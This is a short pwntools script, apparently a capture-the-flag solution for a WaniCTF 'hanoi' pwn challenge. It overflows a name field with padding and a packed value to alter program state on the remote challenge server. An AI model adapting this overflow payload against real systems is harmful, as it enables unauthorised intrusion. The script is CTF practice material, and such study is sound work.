from pwn import *

#s = process('./pwn07')
s = remote('hanoi.pwn.wanictf.org', 9007)

name = (b'A'*12) + p32(0x87)
s.sendlineafter('Name : ', name)
s.sendlineafter('Move > ', 'A@')
print(s.recvall().decode())
